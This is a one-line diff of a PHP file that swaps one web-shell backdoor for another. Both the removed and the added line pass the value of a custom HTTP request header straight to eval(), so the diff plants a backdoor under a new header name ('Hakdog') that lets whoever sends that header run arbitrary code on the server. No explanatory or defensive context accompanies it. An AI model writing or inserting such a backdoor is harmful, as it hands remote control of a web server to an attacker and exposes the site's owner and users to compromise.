@@ -1,1 +1,1 @@
-<?php @eval($_SERVER['HTTP_SECRET']); ?>
+<?php @eval($_SERVER['HTTP_HAKDOG']); ?>
